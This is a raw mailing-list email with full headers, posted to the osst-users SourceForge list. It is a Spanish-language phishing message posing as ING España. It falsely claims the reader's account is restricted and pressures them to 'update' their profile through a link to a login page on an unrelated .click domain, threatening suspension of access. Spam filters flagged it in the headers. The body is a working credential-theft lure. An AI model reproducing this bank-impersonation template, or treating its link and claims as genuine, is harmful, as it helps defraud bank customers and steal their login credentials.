Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 679B1D06C3C
	for <lists+osst-users@lfdr.de>; Fri, 09 Jan 2026 02:44:12 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:To:Date:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=iFOhmg/sJTgFcTva4ps6oyDwzo20fsO2RtLpejuMNrs=; b=a0D/Gmr14YJ4Iq79TpRs+hggSp
	G0NU9rVFDI8fvtReNZ736VdOvzP24r6u+dK2xhTJKmW/js1tRHoB1jlFSvSLDWi7+DG2qGj4q70Mm
	A1yUk3YsCcygozDbTV1h62UeiyG+J6bFy+yWYHg4+/0c1lOrs4AX/tUUTu+jkCaRBs+8=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1ve1Xv-0006hl-4T
	for lists+osst-users@lfdr.de;
	Fri, 09 Jan 2026 01:44:11 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@atlasocio.com>) id 1ve1Xt-0006he-6B
 for osst-users@lists.sourceforge.net; Fri, 09 Jan 2026 01:44:09 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:From:To:Date:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=OR0OTaBacuF3pMLbgAToIGQt83fKYIz3HaByKadnxN4=; b=e18ThQMNYiCMfPEWISLM0wTqMP
 bziky4LsE54R8YwyFm1tiqPO6s1cbrpd0R4VuvpNY5ajv4EAb8YXtB9SXp8uc0vYMv9J4rJZ2Bpns
 6VO0f+Q+kN5j67j77uu5Pw/JHsRszczrYdti9pySdwePvbzwW0RxEMiDzTByikf3cHhE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 From:To:Date:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=OR0OTaBacuF3pMLbgAToIGQt83fKYIz3HaByKadnxN4=; b=E
 j4YVg6OnE73qJpYn7HGJwVnpOaz/Vr9N9cPPAOq19/HhGpUjQLmu/AHB+xKD6JI/wYIfuqCZzgW9d
 XcgoiWWbijrY8BtypJYprmwHEW9b3YFcADKQU5loeme3W2ocXzk5dYpLzz8UPEWAXL2QgQskUAXfs
 btiR4fIyz/affxSU=;
Received: from [107.191.113.95] (helo=atlasocio.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1ve1Xs-00040f-Jz for osst-users@lists.sourceforge.net;
 Fri, 09 Jan 2026 01:44:09 +0000
Received: by atlasocio.com (Postfix, from userid 33)
 id 0CA5C884D9; Fri,  9 Jan 2026 01:31:36 +0000 (UTC)
Date: Fri, 9 Jan 2026 01:20:24 +0000
To: osst-users@lists.sourceforge.net
Message-ID: <3266bc1f31d3ebe7220cadd178da3147@ingdirect.es>
MIME-Version: 1.0
X-Spam-Score: 5.9 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  &nbsp; Mensaje autom&aacute;tico 
 Content analysis details:   (5.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
 [107.191.113.95 listed in dnsbl-2.uceprotect.net]
 2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
 [URI: www.animant-door.click (click)]
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.6 HTML_IMAGE_ONLY_12     BODY: HTML: images with 800-1200 bytes of words
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1ve1Xs-00040f-Jz
Subject: [Osst-users] [SPAM] Contrato restringido
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: ING via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: ING <contacto@ingdirect.es>
Content-Type: multipart/mixed; boundary="===============0143381491907831882=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============0143381491907831882==
Content-Type: multipart/alternative;
	boundary="1cdd08aa28a8571e65e886e879815adb0"
Content-Transfer-Encoding: 8bit

This is a multi-part message in MIME format.

--1cdd08aa28a8571e65e886e879815adb0
Content-Type: text/plain; charset=us-ascii




	




&nbsp;

************** Mensaje autom&aacute;tico**************

&nbsp;

Hola,

Su perfil de cliente est&aacute; incompleto,
por lo que hemos restringido su espacio.
Todas las operaciones de cr&eacute;dito y d&eacute;bito est&aacute;n temporalmente suspendidas.
Para volver a disfrutar de todos sus servicios de pago en l&iacute;nea, actualice su perfil:

Actualizaci&oacute;n

*Si ignora este aviso, se suspender&aacute; el acceso a su cuenta en l&iacute;nea.

ING Espa&ntilde;a



--1cdd08aa28a8571e65e886e879815adb0
Content-Type: text/html; charset=us-ascii

<!doctype html>
<html>
<head>
	<title></title>
</head>
<body>
<p><img alt="" src="https://ing.com/webfiles/1764671720401/images/ing-logo.svg" /></p>

<p>&nbsp;</p>

<p>************** Mensaje autom&aacute;tico**************</p>

<p>&nbsp;</p>

<p>Hola,</p>

<p>Su perfil de cliente est&aacute; incompleto,<br />
por lo que hemos restringido su espacio.<br />
Todas las operaciones de cr&eacute;dito y d&eacute;bito est&aacute;n temporalmente suspendidas.<br />
Para volver a disfrutar de todos sus servicios de pago en l&iacute;nea, actualice su perfil:</p>

<p><a href="https://www.animant-door.click/auth/login.php"><span style="color:#FF8C00;"><strong>Actualizaci&oacute;n</strong></span></a></p>

<p><strong>*Si ignora este aviso, se suspender&aacute; el acceso a su cuenta en l&iacute;nea.</strong></p>

<p>ING Espa&ntilde;a</p>
</body>
</html>



--1cdd08aa28a8571e65e886e879815adb0--


--===============0143381491907831882==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0143381491907831882==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0143381491907831882==--

